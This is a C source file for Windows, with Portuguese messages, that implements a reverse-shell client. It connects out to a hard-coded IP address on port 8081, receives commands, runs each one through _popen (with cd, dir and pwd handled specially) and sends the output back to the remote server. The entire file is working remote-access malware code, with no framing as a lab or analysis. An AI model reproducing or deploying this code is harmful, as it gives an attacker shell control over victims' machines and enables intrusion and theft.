#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <direct.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "172.26.122.204" // IP do servidor
#define PORT 8081
#define BUFFER_SIZE 4096

void execute_command(char* cmd, SOCKET sock) {
    FILE* fp;
    char buffer[BUFFER_SIZE];
    char path[BUFFER_SIZE];

    // Comandos especiais (cd, dir, pwd)
    if (strncmp(cmd, "cd ", 3) == 0) {
        if (chdir(cmd + 3) != 0) {
            sprintf(buffer, "[!] Erro ao mudar de diretorio\n[CMD_END]\n");
        } else {
            getcwd(path, sizeof(path));
            sprintf(buffer, "[+] Diretorio alterado para: %s\n[CMD_END]\n", path);
        }
        send(sock, buffer, strlen(buffer), 0);
        return;
    }

    if (strcmp(cmd, "dir") == 0) {
        fp = _popen("dir", "r");
        if (!fp) {
            sprintf(buffer, "[!] Erro ao executar 'dir'\n[CMD_END]\n");
            send(sock, buffer, strlen(buffer), 0);
            return;
        }
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            send(sock, buffer, strlen(buffer), 0);
        }
        _pclose(fp);
        send(sock, "[CMD_END]\n", 10, 0);
        return;
    }

    if (strcmp(cmd, "pwd") == 0) {
        getcwd(path, sizeof(path));
        sprintf(buffer, "[+] Diretorio atual: %s\n[CMD_END]\n", path);
        send(sock, buffer, strlen(buffer), 0);
        return;
    }

    // Executa comandos genéricos (system)
    fp = _popen(cmd, "r");
    if (!fp) {
        sprintf(buffer, "[!] Comando invalido\n[CMD_END]\n");
        send(sock, buffer, strlen(buffer), 0);
        return;
    }

    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        send(sock, buffer, strlen(buffer), 0);
    }
    _pclose(fp);
    send(sock, "[CMD_END]\n", 10, 0);
}

int main() {
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in server;
    char command[BUFFER_SIZE];

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("[!] Erro ao iniciar Winsock\n");
        return 1;
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        printf("[!] Erro ao criar socket\n");
        WSACleanup();
        return 1;
    }

    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(SERVER_IP);
    server.sin_port = htons(PORT);

    printf("[*] Conectando ao servidor %s:%d...\n", SERVER_IP, PORT);
    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        printf("[!] Erro ao conectar (Verifique IP/Porta/Firewall)\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    printf("[+] Conectado! Aguardando comandos...\n");

    while (1) {
        memset(command, 0, BUFFER_SIZE);
        int bytes_received = recv(sock, command, BUFFER_SIZE, 0);

        if (bytes_received <= 0) {
            printf("[!] Conexao perdida\n");
            break;
        }

        if (strcmp(command, "exit") == 0) {
            printf("[*] Servidor encerrou a conexao\n");
            break;
        }

        execute_command(command, sock);
    }

    closesocket(sock);
    WSACleanup();
    return 0;
}